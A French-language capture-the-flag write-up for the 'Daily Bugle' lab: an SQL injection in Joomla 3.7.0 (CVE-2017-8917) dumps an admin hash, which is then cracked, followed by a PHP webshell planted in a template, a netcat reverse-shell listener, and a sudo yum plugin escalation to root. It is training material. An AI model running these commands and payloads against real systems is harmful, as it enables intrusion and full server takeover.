Daily Bugle

JoomlaCVE-2017-8917 SQLibcryptJohnyum

Joomla 3.7.0 vulnérable à une SQLi (CVE-2017-8917). Dump du hash bcrypt admin, crack avec John. Escalade de privilèges via sudo yum.

Reconnaissance

bash 
nmap -sC -sV lab.thm
curl http://lab.thm/README.txt   # → Joomla 3.7.0

SQLi — CVE-2017-8917

Le composant com_fields de Joomla 3.7.0 est vulnérable à une SQLi union-based. On utilise un exploit Python public :

bash 
python3 42033.py -u http://lab.thm
output 
Username : jonah
Hash     : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm

Crack bcrypt avec John

bash 
john --format=bcrypt \
  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Mot de passe Joomla admin : spiderman123

Webshell via Joomla Templates

Connecté côté admin Joomla (/administrator), on injecte un webshell PHP dans un template :

  1. Extensions → Templates → Protostar → Templates
  2. Éditer index.php, ajouter <?php system($_GET['cmd']); ?>
  3. Accéder à http://lab.thm/?cmd=id
Reverse Shell
nc -lvnp 9001
# URL-encode le payload bash rev shell dans ?cmd=

Flags

bash 
cat /home/jjameson/user.txt
User flag : 27a260fe3cba712cfdedb1c86d80442e

Escalade de privilèges — yum

bash 
sudo -l
(root) NOPASSWD: /usr/bin/yum

Via GTFOBins — yum permet d'exécuter des commandes via un plugin :

bash — GTFOBins yum
TF=$(mktemp -d)
cat >$TF/x.conf <<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf <<EOF
[main]
enabled=1
EOF
cat >$TF/y.py <<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x.conf --enableplugin=y
Root flag : eec3d53292b1821868266858d7fa6f79

Leçons apprises

  • Toujours mettre à jour le CMS — Joomla 3.7.0 est vulnérable à SQLi triviale
  • L'accès admin Joomla = webshell garanti via édition de templates
  • GTFOBins est une référence incontournable pour les privesc sudo
  • bcrypt ralentit le bruteforce mais rockyou reste efficace sur mots faibles
